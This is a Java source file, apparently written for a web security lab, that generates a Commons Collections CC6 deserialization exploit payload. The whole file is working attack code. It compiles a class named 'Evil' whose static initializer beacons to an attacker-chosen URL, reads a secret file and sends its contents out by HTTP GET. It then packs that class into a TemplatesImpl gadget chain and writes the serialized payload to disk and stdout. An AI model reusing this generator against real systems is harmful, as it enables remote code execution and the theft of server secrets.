// TransletGen.java - canonical Java 8 source of the generator (mirror of TransletGen.bsh).
//
// WHY THIS ISN'T THE EXECUTED FILE: this host runs a JRE-only Java 1.8.0_511 (no javac),
// and tools/utils-bundle.jar bundles no compiler (no com/sun/tools/javac, no org/eclipse/jdt,
// no javax.tools impl). The BeanShell mirror TransletGen.bsh (same logic, executed via
// `java -cp utils-bundle.jar bsh.Interpreter TransletGen.bsh`) is what actually runs here.
//
// Compile when a JDK is available:
//   javac -cp "E:\Zcode project\Cyber\warroom\tools\utils-bundle.jar" TransletGen.java
// Run (from the scripts dir):
//   java -cp "E:\Zcode project\Cyber\warroom\tools\utils-bundle.jar;." TransletGen <BEACON_URL> [SECRET_PATH]
//
// Behavior:
//   - Builds class "Evil" extending AbstractTranslet with javassist; its static initializer
//     GETs <BEACON>/x/alive, reads SECRET_PATH, URL-encodes it and GETs <BEACON>/x/s?d=<enc>,
//     and on any exception GETs <BEACON>/x/err?e=<enc>. Each step in its own try/catch.
//   - Assembles TemplatesImpl (_bytecodes=[Evil], _name="x", _tfactory=new TransformerFactoryImpl()).
//   - Wraps ConstantTransformer(templates) -> InvokerTransformer("newTransformer") in a
//     ChainedTransformer inside LazyMap+TiedMapEntry inside a HashSet (CC6 shape).
//   - Writes raw serialized bytes to stdout (binary) and ./translet_raw.bin; errors -> stderr.

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtNewMethod;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class TransletGen {

    static String toSrcType(Class<?> c) {
        if (!c.isArray()) return c.getName();
        String n = c.getName();
        int depth = 0;
        while (n.charAt(depth) == '[') depth++;
        String base = n.substring(depth);
        String src;
        if (base.startsWith("L") && base.endsWith(";")) {
            src = base.substring(1, base.length() - 1);
        } else if (base.equals("I")) { src = "int"; }
        else if (base.equals("J")) { src = "long"; }
        else if (base.equals("Z")) { src = "boolean"; }
        else if (base.equals("B")) { src = "byte"; }
        else if (base.equals("S")) { src = "short"; }
        else if (base.equals("C")) { src = "char"; }
        else if (base.equals("F")) { src = "float"; }
        else if (base.equals("D")) { src = "double"; }
        else { src = base; }
        for (int k = 0; k < depth; k++) src = src + "[]";
        return src;
    }

    static void setF(Object o, String name, Object v) throws Exception {
        Class<?> c = o.getClass();
        while (c != null) {
            try {
                Field f = c.getDeclaredField(name);
                f.setAccessible(true);
                f.set(o, v);
                return;
            } catch (NoSuchFieldException e) {
                c = c.getSuperclass();
            }
        }
        throw new RuntimeException("field not found: " + name);
    }

    public static void main(String[] args) throws Exception {
        String beacon = args.length > 0 ? args[0] : System.getProperty("psx.beacon");
        String secretPath = args.length > 1 && args[1].length() > 0 ? args[1]
            : System.getProperty("psx.secret", "/home/carlos/secret");
        if (beacon == null) {
            System.err.println("usage: TransletGen <BEACON_URL> [SECRET_PATH]");
            System.exit(2);
        }
        if (beacon.endsWith("/")) beacon = beacon.substring(0, beacon.length() - 1);
        secretPath = secretPath.replace("\\", "/");
        System.err.println("[*] java=" + System.getProperty("java.version")
            + " beacon=" + beacon + " secretPath=" + secretPath);

        // ---- 1) build the Evil translet class with javassist ----
        StringBuilder sc = new StringBuilder();
        sc.append("String B = \"").append(beacon).append("\";\n");
        sc.append("try {\n");
        // beacon 1: alive
        sc.append("  try {\n");
        sc.append("    java.net.HttpURLConnection c = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/alive\").openConnection();\n");
        sc.append("    c.setConnectTimeout(5000);\n");
        sc.append("    c.setReadTimeout(5000);\n");
        sc.append("    c.getResponseCode();\n");
        sc.append("    try { c.getInputStream().close(); } catch (Exception ig1) {}\n");
        sc.append("  } catch (Exception e1) {\n");
        sc.append("    try {\n");
        sc.append("      String es = java.net.URLEncoder.encode(String.valueOf(e1), \"UTF-8\");\n");
        sc.append("      java.net.HttpURLConnection ce = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/err?e=\" + es).openConnection();\n");
        sc.append("      ce.setConnectTimeout(5000);\n");
        sc.append("      ce.setReadTimeout(5000);\n");
        sc.append("      ce.getResponseCode();\n");
        sc.append("      try { ce.getInputStream().close(); } catch (Exception ig2) {}\n");
        sc.append("    } catch (Exception e2) {}\n");
        sc.append("  }\n");
        // read secret + exfil
        sc.append("  try {\n");
        sc.append("    byte[] d = java.nio.file.Files.readAllBytes(new java.io.File(\"").append(secretPath).append("\").toPath());\n");
        sc.append("    String denc = java.net.URLEncoder.encode(new String(d, \"UTF-8\"), \"UTF-8\");\n");
        sc.append("    java.net.HttpURLConnection cs = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/s?d=\" + denc).openConnection();\n");
        sc.append("    cs.setConnectTimeout(5000);\n");
        sc.append("    cs.setReadTimeout(5000);\n");
        sc.append("    cs.getResponseCode();\n");
        sc.append("    try { cs.getInputStream().close(); } catch (Exception ig3) {}\n");
        sc.append("  } catch (Exception e3) {\n");
        sc.append("    try {\n");
        sc.append("      String es2 = java.net.URLEncoder.encode(String.valueOf(e3), \"UTF-8\");\n");
        sc.append("      java.net.HttpURLConnection ce2 = (java.net.HttpURLConnection) new java.net.URL(B + \"/x/err?e=\" + es2).openConnection();\n");
        sc.append("      ce2.setConnectTimeout(5000);\n");
        sc.append("      ce2.setReadTimeout(5000);\n");
        sc.append("      ce2.getResponseCode();\n");
        sc.append("      try { ce2.getInputStream().close(); } catch (Exception ig4) {}\n");
        sc.append("    } catch (Exception e4) {}\n");
        sc.append("  }\n");
        sc.append("} catch (Throwable t9) {}\n");

        ClassPool pool = ClassPool.getDefault();
        CtClass ct = pool.makeClass("Evil");
        ct.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ct.makeClassInitializer().insertBefore(sc.toString());

        CtConstructor ctor = new CtConstructor(new CtClass[0], ct);
        ctor.setBody("{}");
        ct.addConstructor(ctor);

        Class<?> absCls = Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        Set<String> seen = new HashSet<String>();
        for (Method m : absCls.getMethods()) {
            if (!Modifier.isAbstract(m.getModifiers())) continue;
            Class<?>[] pt = m.getParameterTypes();
            StringBuilder sb = new StringBuilder(m.getName()).append("(");
            for (int j = 0; j < pt.length; j++) {
                if (j > 0) sb.append(", ");
                sb.append(toSrcType(pt[j])).append(" p").append(j);
            }
            sb.append(")");
            String sig = sb.toString();
            if (!seen.add(sig)) continue;
            try {
                String msrc = "public " + toSrcType(m.getReturnType()) + " " + sig + " {}";
                ct.addMethod(CtNewMethod.make(msrc, ct));
                System.err.println("[+] impl abstract: " + msrc);
            } catch (Throwable t) {
                System.err.println("[!] impl failed (non-fatal): " + sig + " :: " + t);
            }
        }

        byte[] byteCode = ct.toBytecode();
        System.err.println("[+] Evil bytecode: " + byteCode.length + " bytes");

        // ---- 2) assemble TemplatesImpl via reflection ----
        TemplatesImpl tm = new TemplatesImpl();
        byte[][] bcArr = new byte[1][];
        bcArr[0] = byteCode;
        setF(tm, "_bytecodes", bcArr);
        setF(tm, "_name", "x");
        setF(tm, "_tfactory", new TransformerFactoryImpl());

        // ---- 3) CC6 gadget chain (commons-collections 3.x) ----
        Class<?> tif = Class.forName("org.apache.commons.collections.Transformer");
        Transformer[] fakeArr = (Transformer[]) Array.newInstance(tif, 1);
        fakeArr[0] = new ConstantTransformer(Integer.valueOf(1));
        ChainedTransformer chain = new ChainedTransformer(fakeArr);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet hset = new HashSet();
        hset.add(entry);          // hashCode fires the FAKE chain; inner map gets foo=1
        lazyMap.remove("foo");    // so the deser-time hashCode triggers the real chain

        Transformer[] realArr = (Transformer[]) Array.newInstance(tif, 2);
        realArr[0] = new ConstantTransformer(tm);
        realArr[1] = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);

        Field fch = ChainedTransformer.class.getDeclaredField("iTransformers");
        fch.setAccessible(true);
        fch.set(chain, realArr);

        // ---- 4) serialize ----
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(hset);
        oos.close();
        byte[] bytes = bos.toByteArray();

        FileOutputStream fos = new FileOutputStream("translet_raw.bin");
        fos.write(bytes);
        fos.close();

        System.out.write(bytes, 0, bytes.length);
        System.out.flush();
        System.err.println("[+] payload " + bytes.length + " bytes -> translet_raw.bin + stdout");
    }
}
